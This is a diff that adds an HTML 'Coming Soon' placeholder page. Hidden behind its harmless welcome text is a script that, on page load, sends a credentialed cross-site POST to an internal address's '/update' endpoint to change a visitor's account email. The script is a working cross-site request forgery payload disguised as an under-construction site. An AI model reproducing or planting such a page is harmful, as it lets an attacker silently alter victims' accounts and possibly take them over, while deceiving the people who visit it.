@@ -1,0 +1,21 @@
+<html>
+    <head>
+        <title>Coming Soon</title>
+    </head>
+
+    <body>
+        <p>Welcome to this site. Full site coming soon!</p>
+
+        <script>
+            var xhr = new XMLHttpRequest();
+            var url = "https://172.22.227.209:8443/update";
+            var body = "email=email";
+
+            xhr.open("POST", url);
+            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+            xhr.withCredentials = true;
+            xhr.send(body);
+        </script>
+    </body>
+</html>
+
